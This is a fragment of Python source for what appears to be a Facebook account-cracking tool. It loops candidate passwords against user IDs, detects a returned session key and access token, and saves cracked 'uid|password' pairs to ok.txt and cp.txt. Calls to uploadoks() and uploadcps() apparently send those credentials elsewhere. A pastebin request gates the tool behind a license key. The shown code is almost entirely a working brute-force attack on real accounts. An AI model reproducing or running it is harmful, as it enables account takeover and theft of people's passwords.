...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://pastebin.com/raw/EWTZLA1M').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mFREE")
				FY = '\033[0;93m'
...
\033[1;90m══════════════════════════════════════════════════
	...
	def oldcrack(self):
		...
		if (limit)>50000:
			exit("\n%s [!] WARNING ..DON'T CROSS THE LIMIT :)"%(R))
		try:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MRD_OLD] : %s/%s -> \033[0;92m [ MRD-OK:%s ]- \033[0;91m[MRD-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [MRD-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[MRD-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MRD-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
